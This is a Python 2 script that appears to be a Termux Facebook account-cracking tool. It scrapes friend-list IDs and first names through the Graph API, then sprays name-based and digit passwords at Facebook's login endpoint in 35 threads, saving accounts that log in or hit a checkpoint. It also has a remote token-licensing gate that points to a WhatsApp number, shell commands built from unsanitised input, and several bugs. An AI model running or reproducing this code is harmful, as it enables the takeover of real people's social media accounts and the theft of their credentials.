#coding=utf-8
#!/usr/bin/python2
#coded by muhammad hamza

'''
This program is not for sale
'''
try:
    import os, sys , time, datetime, requests, base64, threading, re, json, random
    from multiprocessing.pool import ThreadPool
    from requests.exceptions import ConnectionError
except ImportError:
    os.system('pip2 install requests')
    os.system('python2 hpremium.py')
try:
    os.mkdir('/sdcard/ids')
except:
    pass
reload(sys)
sys.setdefaultencoding('utf-8')
os.system('clear')
bd = random.randint(2e7, 3e7)
sim = random.randint(2e4, 4e4)
logo="""

  
\t##     ##    #######    ########  
\t##     ##   ##     ##   ##     ## 
\t##     ##   ##     ##   ##     ## 
\t#########   ##     ##   ########  
\t##     ##   ##     ##   ##        
\t##     ##   ##     ##   ##        
\t##     ##    #######    ##        

 ---------------------------------------------

   Author   : Muhammad Hamza
   Github   : https://github.com/Hamzahash
   
 --------------------------------------------- """
def subscribe():
	os.system("clear")
	print("")
	print("")
	print("")
	print("")
	try:
		tok = open('/data/data/com.termux/files/usr/bin/.py_compil.py', 'r').read()
		dec = base64.b64decode(tok)
		if len(dec) < 50:
		    not_reg()
		r = requests.get("https://raw.githubusercontent.com/pythoholics/n/main/server.txt").text
		if dec in r:
			main()
		else:
		    print('\n\n   Token not verified yet :(').center(50)
		    print("\n\n\n  Please wait for activation\n\n\n")
		    print('  Your token is : '+dec+'\n\n\n')
		    raw_input("  Press enter to check again ")
		    subscribe()
	except (IOError):
	    not_reg()
	except requests.exceptions.ConnectionError:
	    print('\n\n\nTurn on mobile data OR wifi to continue\n\n\n')
	    sys.exit()
def not_reg():
    print('\n\n\nVerify your token\n\n\n')
    string_token = 'abcdefghijklmnopqrstuvwxyz123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    v_token = ''.join((random.choice(string_token)) for x in range(50))
    v_token_save = open('/data/data/com.termux/files/usr/bin/.py_compil.py', 'w')
    v_token_save.write(base64.b64encode(v_token))
    v_token_save.close()
    print('  Copy this token and press enter to verify... >>> '+v_token)
    raw_input('')
    os.system('xdg-open https://wa.me/+923097992202')
def main():
    os.system('clear')
    print(logo)
    print('')
    print('  [1] Crack file')
    print('  [2] Extract ids')
    print('  [3] Slice & sort ids')
    print('  [4] Exit tool')
    print('')
    s1()
def s1():
    a = raw_input('  \033[1;35mChoose option: \033[0;97m')
    if a =='1':
        crack()
    elif a =='2':
        ex()
    elif a =='3':
        slice()
    elif a =='4':
        os.system('exit()')
    else:
        print('\n\n\nSelect valid option')
        print('')
        s1()
def crack():
    os.system('clear')
    print(logo)
    print('')
    print('  [1] Crack name passwords')
    print('  [2] Crack digit passwords')
    print('  [3] Back')
    print('')
    s2()
def s2():
    id=[]
    oks=[]
    cps=[]
    b = raw_input('  \033[1;35mChoose option: \033[0;97m')
    if b =='1':
        os.system('clear')
        print(logo)
        print('')
        print('  Name pass file cracking ....').center(20)
        print('')
        p1=raw_input('  Password: ')
        p2=raw_input('  Password: ')
        p3=raw_input('  Password: ')
        p4=raw_input('  Password: ')
        access_token=raw_input('  FB apk access token: ')
        f = ('/sdcard/2.txt')
        try:
            for hop in open(f, 'r').readlines():
                id.append(hop.strip())
        except IOError:
            print('')
            print('')
            print('  Requested file not found ')
            print('')
            time.sleep(1)
            crack()
    elif b =='2':
        crack_digit()
    elif b =='3':
        main()
    else:
        print('')
        print('\n\nSelect valid option...\n\n')
        s2()
    os.system('clear')
    print(logo)
    print('')
    print('  Name pass file crack').center(20)
    print('')
    print('  Total ids: '+str(len(id)))
    print('  The process has started')
    print('')
    print(47*'-')
    print('')
    def main(arg):
        user=arg
        uid, name = user.split("|")
        header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT', 'user-agent':'Mozilla/5.0 (Linux; Android 9; Infinix X627) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36','x-fb-connection-type': 'unknown','content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger', 'content-encoding': 'gzip', 'x-fb-friendly-name': 'authenticate', 'accept-encoding': 'gzip, deflate'}
        try:
            pass1 = name.lower()+p1
            data = requests.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&error_detail_type=button_with_disabled&source=auth.login&currently_logged_in_userid=0&access_token="+access_token+"&sig=3f555f99fb61fcd7aa0c44f58f522ef6").text
            q = json.loads(data)
            if "access_token" in q:
                print("  \033[1;32m[HOP-OK] "+uid+" | "+pass1+"\033[0;97m")
                ok = open('/sdcard/ids/ok.txt')
                ok.write(uid+"|"+pass1+"\n")
                ok.close()
                oks.append(uid)
            else:
                if 'www.facebook.com' in q["error_msg"]:
                    print("  \033[1;31m[HOP-CP] "+uid+" | "+pass1+"\033[0;97m")
                    cps.append(uid)
                else:
                    pass2 = name.lower()+p2
                    data = requests.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&error_detail_type=button_with_disabled&source=auth.login&currently_logged_in_userid=0&access_token="+access_token+"&sig=3f555f99fb61fcd7aa0c44f58f522ef6").text
                    q = json.loads(data)
                    if "access_token" in q:
                        print("  \033[1;32m[HOP-OK] "+uid+" | "+pass2+"\033[0;97m")
                        ok = open('/sdcard/ids/ok.txt')
                        ok.write(uid+"|"+pass2+"\n")
                        ok.close()
                        oks.append(uid)
                    else:
                        if 'www.facebook.com' in q["error_msg"]:
                            print("  \033[1;31m[HOP-CP] "+uid+" | "+pass2+"\033[0;97m")
                            cps.append(uid)
                        else:
                            pass3 = name.lower()+p3
                            data = requests.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&error_detail_type=button_with_disabled&source=auth.login&currently_logged_in_userid=0&access_token="+access_token+"&sig=3f555f99fb61fcd7aa0c44f58f522ef6").text
                            q = json.loads(data)
                            if "access_token" in q:
                                print("  \033[1;32m[HOP-OK] "+uid+" | "+pass3+"\033[0;97m")
                                ok = open('/sdcard/ids/ok.txt')
                                ok.write(uid+"|"+pass2+"\n")
                                ok.close()
                                oks.append(uid)
                            else:
                                if 'www.facebook.com' in q["error_msg"]:
                                    print("  \033[1;31m[HOP-CP] "+uid+" | "+pass3+"\033[0;97m")
                                    cps.append(uid)
                                else:
                                    pass4 = name.lower()+p4
                                    data = requests.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass4+"&credentials_type=device_based_login_password&error_detail_type=button_with_disabled&source=auth.login&currently_logged_in_userid=0&access_token="+access_token+"&sig=3f555f99fb61fcd7aa0c44f58f522ef6").text
                                    q = json.loads(data)
                                    if "access_token" in q:
                                        print("  \033[1;32m[HOP-OK] "+uid+" | "+pass4+"\033[0;97m")
                                        ok = open('/sdcard/ids/ok.txt')
                                        ok.write(uid+"|"+pass4+"\n")
                                        ok.close()
                                        oks.append(uid)
                                    else:
                                        if 'www.facebook.com' in q["error_msg"]:
                                            print("  \033[1;31m[HOP-CP] "+uid+" | "+pass4+"\033[0;97m")
                                            cps.append(uid)
        except:
            pass
    p = ThreadPool(35)
    p.map(main,id)
    print('')
    print(47*"-")
    print('')
    print('  The process has completed')
    print('  Total OK/CP: '+str(len(oks))+"/"+str(len(cps)))
    print('')
    print(47*'-')
    print('')
    raw_input('  Press enter to back')
def crack_digit():
    os.system('clear')
    print(logo)
    print('')
    print('  [1] Start cracking')
    print('  [2] Back')
    print('')
    s3()
def s3():
    id=[]
    cps=[]
    oks=[]
    c = raw_input('  Choose option: ')
    if c =='1':
        os.system('clear')
        print(logo)
        print('')
        print('  Digit pass file crack ...').center(20)
        print('')
        pass1 = raw_input('  Password: ')
        pass2 = raw_input('  Password: ')
        pass3 = raw_input('  Password: ')
        pass4 = raw_input('  Password: ')
        access_token=raw_input('  FB apk access token: ')
        f = '/sdcard/2.txt'
        try:
            for hop in open(f, 'r').readlines():
                id.append(hop.strip())
        except IOError:
            print('')
            print('')
            print('  Requested file not found')
            print('')
            time.sleep(1)
            main()
    elif c =='2':
        main()
    else:
        print('')
        print('')
        print('  select valid option ...\n\n')
        time.sleep(1)
        s3()
    os.system('clear')
    print(logo)
    print('')
    print('  Digit pass file crack ').center(20)
    print('')
    print('  Total ids: '+str(len(id)))
    print('  The Process has started')
    print('')
    print(47*'-')
    print('')
    def main(arg):
        user=arg
        uid, name = user.split("|")
        myagent = random.choice(agent)
        header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT', 'user-agent':'Mozilla/5.0 (Linux; Android 9; Infinix X627) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36','x-fb-connection-type': 'unknown','content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger', 'content-encoding': 'gzip', 'x-fb-friendly-name': 'authenticate', 'accept-encoding': 'gzip, deflate'}
        try:
            data = requests.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&error_detail_type=button_with_disabled&source=auth.login&currently_logged_in_userid=0&access_token="+access_token+"&sig=3f555f99fb61fcd7aa0c44f58f522ef6").text
            q = json.loads(data)
            if "access_token" in q:
                print("  \033[1;32m[HOP-OK] "+uid+" | "+pass1+"\033[0;97m")
                ok = open('/sdcard/ids/ok.txt')
                ok.write(uid+"|"+pass1+"\n")
                ok.close()
                oks.append(uid)
            else:
                if 'www.facebook.com' in q["error_msg"]:
                    print("  \033[1;31m[HOP-CP] "+uid+" | "+pass1+"\033[0;97m")
                    cps.append(uid)
                else:
                    data = requests.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&error_detail_type=button_with_disabled&source=auth.login&currently_logged_in_userid=0&access_token="+access_token+"&sig=3f555f99fb61fcd7aa0c44f58f522ef6").text
                    q = json.loads(data)
                    if "access_token" in q:
                        print("  \033[1;32m[HOP-OK] "+uid+" | "+pass2+"\033[0;97m")
                        ok = open('/sdcard/ids/ok.txt')
                        ok.write(uid+"|"+pass2+"\n")
                        ok.close()
                        oks.append(uid)
                    else:
                        if 'www.facebook.com' in q["error_msg"]:
                            print("  \033[1;31m[HOP-CP] "+uid+" | "+pass2+"\033[0;97m")
                            cps.append(uid)
                        else:
                            data = requests.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&error_detail_type=button_with_disabled&source=auth.login&currently_logged_in_userid=0&access_token="+access_token+"&sig=3f555f99fb61fcd7aa0c44f58f522ef6").text
                            q = json.loads(data)
                            if "access_token" in q:
                                print("  \033[1;32m[HOP-OK] "+uid+" | "+pass3+"\033[0;97m")
                                ok = open('/sdcard/ids/ok.txt')
                                ok.write(uid+"|"+pass2+"\n")
                                ok.close()
                                oks.append(uid)
                            else:
                                if 'www.facebook.com' in q["error_msg"]:
                                    print("  \033[1;31m[HOP-CP] "+uid+" | "+pass3+"\033[0;97m")
                                    cps.append(uid)
                                else:
                                    data = requests.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass4+"&credentials_type=device_based_login_password&error_detail_type=button_with_disabled&source=auth.login&currently_logged_in_userid=0&access_token="+access_token+"&sig=3f555f99fb61fcd7aa0c44f58f522ef6").text
                                    q = json.loads(data)
                                    if "access_token" in q:
                                        print("  \033[1;32m[HOP-OK] "+uid+" | "+pass4+"\033[0;97m")
                                        ok = open('/sdcard/ids/ok.txt')
                                        ok.write(uid+"|"+pass4+"\n")
                                        ok.close()
                                        oks.append(uid)
                                    else:
                                        if 'www.facebook.com' in q["error_msg"]:
                                            print("  \033[1;31m[HOP-CP] "+uid+" | "+pass4+"\033[0;97m")
                                            cps.append(uid)
        except:
            pass
    p = ThreadPool(35)
    p.map(main,id)
    print('')
    print(47*"-")
    print('')
    print('  The process has completed')
    print('  Total OK/CP: '+str(len(oks))+"/"+str(len(cps)))
    print('')
    print(47*'-')
    print('')
    raw_input('  Press enter to back')
def ex():
    id=[]
    try:
        token = open('access_token.txt', 'r').read()
    except (IOError):
        os.system('clear')
        print('')
        print('')
        print('  Facebook access token is missing ...')
        print('')
        time.sleep(1)
        login()
    try:
        r = requests.get('https://graph.facebook.com/me?access_token='+token)
        q = json.loads(r.text)
        name = q['name']
    except(KeyError):
        os.system('clear')
        print('')
        print('')
        print('   Logged in Facebook access token has expired ...')
        print('')
        time.sleep(1)
        login()
    os.system('clear')
    print(logo)
    print('')
    print('  Hey ! Welcome: '+name)
    print('')
    print(47*'-')
    print('')
    print('  Public ids friendlist grabbing tool ...')
    print('')
    cid = raw_input('  Input id link: ')
    try:
        r = requests.get("https://graph.facebook.com/"+cid+"?access_token="+token)
        s = json.loads(r.text)
        t = s['name']
        print('  Grabbing ids from: '+t)
    except(KeyError):
        print('')
        print('  Invalid id link OR token found')
        print('')
        time.sleep(1)
        menu()
    data = requests.get("https://graph.facebook.com/"+cid+"/friends?access_token="+token)
    q = json.loads(data.text)
    id_sav = open('/sdcard/ids_friends.txt', 'a')
    for i in q['data']:
        ids = i['id']
        name = i['name']
        name_f=name.rsplit(' ')[0]
        id.append(ids)
        id_sav.write(ids+'|'+name_f+'\n')
    id_sav.close()
    print('')
    print(47*'-')
    print('')
    print('  Ids grabbed successfully')
    print('  Total ids grabbed: '+str(len(id)))
    print('  File stored in: /sdcard/ids_friends.txt')
    print('')
    print(47*'-')
    print('')
    raw_input('  Press enter to back ')
    ex()
def login():
    os.system('clear')
    print(logo)
    print('')
    print('Login menu').center(30)
    print('')
    print('  [1] Login with token')
    print('  [2] Login with ID/PASS')
    print('  [0] Back')
    print('')
    login_sel()
def login_sel():
    sel = raw_input('  Your choice here: ')
    if sel =='1':
        print('')
        print('Facebook Token Login').center(30)
        print('')
        token = raw_input('  Paste token here:  ')
        tokensave = open('access_token.txt', 'w')
        tokensave.write(token)
        tokensave.close()
        main()
    elif sel =='2':
        print('')
        print('FaceBook ID/PASS Login').center(30)
        print('')
        uid = raw_input('  Id/mail/number: ')
        passw = raw_input('  Password: ')
        data  = requests.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+passw+"&credentials_type=device_based_login_password&error_detail_type=button_with_disabled&source=auth.login&currently_logged_in_userid=0&access_token="+access_token+"&sig=3f555f99fb61fcd7aa0c44f58f522ef6").text
        q = json.loads(data)
        if 'access_token' in q:
            token_save = open('access_token.txt', 'w')
            token_save.write(q["access_token"])
            token_save.close()
            print('')
            print('  Login successfull ...')
            time.sleep(1)
            menu()
        elif 'www.facebook.com' in q['error_msg']:
            print('')
            print('  Your account has checkpoint ...')
            time.sleep(2)
            main()
        else:
            print('')
            print('   Id/mail/number Or Password may be wrong')
            time.sleep(1)
            login()
    elif sel =='0':
        menu()
    else:
        print('')
        print('    Choose valid option ...')
        print('')
        login()
def slice():
    os.system('clear')
    print(logo)
    print('')
    print('  Separate link menu ...').center(20)
    print('')
    l1=raw_input('  Link number: ')
    l2=raw_input('  Link number: ')
    os.system('cat /sdcard/ids_friends.txt | grep '+l1+' > /sdcard/1.txt')
    os.system('cat /sdcard/ids_friends.txt | grep '+l2+' >> /sdcard/1.txt')
    os.system('sort -r /sdcard/1.txt | uniq > /sdcard/2.txt')
    os.system('rm -rf /sdcard/ids_friends.txt /sdcard/1.txt')
    print('')
    print('')
    print('  Sliced successfully ...')
    print('')
    print('')
    raw_input('  Press enter to back ')
    main()
main()

